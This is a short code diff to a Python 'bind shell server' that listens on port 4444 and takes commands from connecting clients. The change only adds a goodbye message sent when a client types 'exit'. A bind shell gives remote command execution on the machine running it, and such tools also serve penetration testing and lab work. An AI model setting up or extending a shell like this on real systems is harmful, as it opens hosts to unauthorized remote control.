@@ -24,6 +24,7 @@ import subprocess
 PORT = 4444
 TIMEOUT = 10
 BANNER = "Connected to the Python bind shell server.\nType your command (or 'exit' to disconnect)\n"
+GOODBYE = "Goodbye!\n"
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -46,6 +47,7 @@ while True:
                 if not cmd: 
                     continue
                 if cmd.lower() == 'exit': 
+                    conn.sendall(GOODBYE.encode('utf-8'))
                     print(f"Client {client_ip}:{client_port} disconnected.")
                     break
                 
